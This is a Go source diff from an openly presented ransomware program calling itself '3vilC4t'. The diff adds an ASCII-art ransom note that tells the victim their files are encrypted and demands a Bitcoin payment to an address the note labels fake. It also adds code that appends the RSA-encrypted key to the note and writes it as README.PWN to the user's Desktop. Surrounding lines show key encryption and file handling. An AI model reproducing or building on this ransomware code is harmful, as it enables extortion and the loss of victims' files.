@@ -10,6 +10,47 @@ import (
 // Encryption key needs to be a global so we can reference it in the frontend
 var EncryptionKey []byte
 
+var ransomNoteMsg string = `                                                                                
+                                                     ,,                         
+                       ,,,                          ,,,,,,                      
+                    ,,, ,,                        ,,,    ,,,,                   
+                 ,,,,    ,,                      ,,       ,,,,,,                
+               ,,,,       ,,                    ,,          ,,,,,,              
+             ,,,,          ,,                 .,             ,,,,,,             
+           ,,,,,             ,,              ,,               ,,,,,,,           
+          ,,,,,                ,,           ,                                   
+         ,,,,,                                                                  
+                                                ,,,                             
+                    ,,,,,,,,                ,,,,,,,,,,,                         
+                   ,,,,,,,,,,*             ,,,,,,,,,,,,,                        
+                   ,,,,,,,,,,.             ,,,,,,,,,,,,,&                       
+         ,,         ,,,,,,,,                *,,,,,,,,,,,         ,              
+        ,.                                     (,,,,              ,             
+        ,,                                                      .,,             
+        ,,,,                                                  ,, ,,             
+           ,,,,, ,,,,,                          .,     ,,,, ,, .,               
+            , ,,,,,,,, , ,,,,,, ,,,,,  ,,,,   ,,,,,,.,, ,,.,,,,                 
+               ,,, ,, ,,,,,,,,, ,,,, ,, ,,, ,, ,,,, ,,,, ,                      
+                   . ,,,,,,,,,,, ,, ,,,,,,,,,,  ,, ,,,,,                        
+                           ,,,,,, .,,,,, ,,,,,,                                 
+
+	▓█████ ██▒   █▓ ██▓ ██▓        ▄████▄   ▄▄▄     ▄▄▄█████▓
+	▓█   ▀▓██░   █▒▓██▒▓██▒       ▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒
+	▒███   ▓██  █▒░▒██▒▒██░       ▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░
+	▒▓█  ▄  ▒██ █░░░██░▒██░       ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ 
+	░▒████▒  ▒▀█░  ░██░░██████▒   ▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ 
+	░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░   ░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   
+	░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░     ░  ▒     ▒   ▒▒ ░   ░    
+		░       ░░   ▒ ░  ░ ░      ░          ░   ▒    ░      
+		░  ░     ░   ░      ░  ░   ░ ░            ░  ░        
+				░                  ░                          
+
+You have been infected by 3vilC4t virus. All your files have been encrypted. Do not attempt to decrypt the files on your own. It will cause irreversible damage.
+DO NOT DELETE THIS FILE. If this file is deleted, your files will be double encrypted. At that point, recovering your files will be impossible. In order to recieve
+the key to decrypt your files, you must pay 0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf (This is a fake address.) Add a contact method to the description of
+the transaction as well as the KeyID, and a key will be sent to that contact. There are numerous guides on how to purchase bitcoin online. Good luck.				
+`
+
 func isFirstTime() bool {
 	cookie := os.Getenv("USERPROFLE") + "\\Desktop\\" + "README.PWN"
 	if _, err := os.Stat(cookie); os.IsNotExist(err) {
@@ -68,6 +109,10 @@ gwIDAQAB
 
 	// Encrypt the key so that it can't be reversed.
 	EncryptionKey = EncryptDataRSA(publicRSAKey, EncryptionKey)
+	ransomBytes := []byte(ransomNoteMsg + getEncryptedKey())
+	WriteToFile(os.Getenv("USERPROFILE")+"DESKTOP\\README.PWN", ransomBytes)
+
+	// Append the key
 	for _, f := range files {
 		fmt.Println(f)
 	}
